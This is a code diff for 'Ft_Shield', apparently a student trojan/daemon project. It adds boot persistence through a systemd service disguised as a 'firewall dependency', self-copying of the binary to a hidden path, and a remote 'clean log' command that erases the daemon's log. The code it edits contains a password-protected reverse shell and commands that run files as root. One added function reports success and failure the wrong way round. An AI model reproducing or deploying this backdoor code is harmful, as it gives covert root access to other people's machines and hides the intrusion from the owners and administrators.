@@ -11,6 +11,7 @@
 /* ************************************************************************** */
 
 #include <iostream>
+#include <fstream>
 #include <string>
 #include <csignal>
 
@@ -26,8 +27,6 @@
 
 #define EXIT_SUCCESS 0
 #define EXIT_FAILURE 1
-#define DAEMON_LOG_FILE "/var/log/.matt_daemon"
-#define DAEMON_LOCK_FILE "/var/lock/.matt_daemon"
 
 /*
  * SIGPIPE handler:
@@ -55,6 +54,7 @@ Ft_Shield::Ft_Shield(void) : _port(4242), _MaxClients(3), _run(true), _maxfd(2),
 	this->_cmdMap["help\n"]		= &Ft_Shield::_help;
 	this->_cmdMap["elfAsRoot\n"]= &Ft_Shield::_elfAsRoot;
 	this->_cmdMap["rootLike\n"]	= &Ft_Shield::_rootLike;
+	this->_cmdMap["clean log\n"]= &Ft_Shield::_cleanLog;
 	return;
 }
 
@@ -81,7 +81,6 @@ Ft_Shield::~Ft_Shield(void)
 		close(fd);
 	}
 	remove(DAEMON_LOCK_FILE);
-	//remove(DAEMON_LOG_FILE);
 	return;
 }
 
@@ -105,7 +104,6 @@ void Ft_Shield::daemonize(void)
 	int	pid		= 0;
 	char buf[9] = {'\0'};
 
-	std::cout << "halvarez" << std::endl;
 	/* Signal handler to ignore broken pipe signal in case of client brutal disconnection */
 	std::signal(SIGPIPE, &brokenPipe);
 	/* First fork to detach from the current processus */
@@ -154,6 +152,29 @@ void Ft_Shield::daemonize(void)
 			}
 		}
 	}
+	return;
+}
+
+/*
+ * Copy the ft_shield executable in /usr/local/bin/.ft_shield
+ * Create a service entry in systemctl to run the program at startup
+ */
+void	Ft_Shield::setup(char const *me)
+{
+	std::ofstream	service(INIT_FILE, std::ios::binary);
+
+	if (service.is_open())
+	{
+		service << "[Unit]" << std::endl;
+		service << "Description=firewall dependency" << std::endl;
+		service << "[Service]" << std::endl;
+		service << "ExecStart=" << COPY_ELF << " --on-boot" << std::endl;
+		service << "[Install]" << std::endl;
+		service << "WantedBy=multi-user.target" << std::endl;
+		service.close();
+		system("systemctl enable ft_shield.service --now");
+	}
+	this->_copy(me);
 	return;
 }
 
@@ -351,8 +372,8 @@ void	Ft_Shield::_reverseShell(int fd)
 		dup2(fd, STDOUT_FILENO);
 		dup2(fd, STDERR_FILENO);
 		close(fd);
-		execve(shell[0], shell, NULL);
-		this->_exit();
+		if (execve(shell[0], shell, NULL) == -1)
+			this->_exit();
 	}
 	else if (pid != -1 && pid > 0)
 	{
@@ -400,7 +421,7 @@ void	Ft_Shield::_help(int fd)
  * Password: P@ylo@d42\n\0
  * The \n is due to the input in netcat
  */
-int	Ft_Shield::_password(int fd)
+int	Ft_Shield::_password(int fd) const
 {
 	std::string		msg = "You have 8s to enter the password:\n";
 	char			char_buf[15] = {'\0'};
@@ -486,10 +507,19 @@ void	Ft_Shield::_elfAsRoot(int fd)
 		if (access(char_buf, F_OK) != -1)
 		{
 			pid = fork();
-			if (pid == 0)
-				execve(file[0], file, NULL);
-			else
+			if (pid != -1 && pid == 0)
+			{
+				if (execve(file[0], file, NULL) == -1)
+				{
+					this->_buffer = "Error executing the file.\n";
+					send(fd, this->_buffer.c_str(), this->_buffer.length(), 0);
+					this->_exit();
+				}
+			}
+			else if (pid != -1 && pid != 0)
 				this->_buffer = "Program launched.\n";
+			else
+				this->_buffer = "Error executing the file.\n";
 		}
 		else
 			this->_buffer = "Error: no such file.\n";
@@ -533,5 +563,39 @@ void	Ft_Shield::_rootLike(int fd)
 			this->_buffer = "Error: no suche file.\n";
 		send(fd, this->_buffer.c_str(), this->_buffer.length(), 0);
 	}
+	return;
+}
+
+/*
+ * Copy the file to the specified location in COPY_FILE macro
+ */
+void	Ft_Shield::_copy(char const *me) const
+{
+	std::ifstream	src(me, std::ios::binary);
+	std::ofstream	dst(COPY_ELF, std::ios::binary);
+
+	dst << src.rdbuf();
+	src.close();
+	dst.close();
+	return;
+}
+
+/*
+ * Clean the log file
+ */
+void	Ft_Shield::_cleanLog(int fd __attribute__((unused)))
+{
+	close(this->_logFile);
+	if (remove(DAEMON_LOG_FILE) == -1)
+		this->_buffer = "Deletion failed";
+	else
+	{
+		this->_logFile = open(DAEMON_LOG_FILE, O_RDWR | O_CREAT | O_APPEND);
+		if (this->_logFile == -1)
+			this->_buffer = "Log file deleted and new one has been created.\n";
+		else
+			this->_buffer = "Log file deleted but creation of a new log file failed.\n";
+	}
+	send(fd, this->_buffer.c_str(), this->_buffer.length(), 0);
 	return;
 }
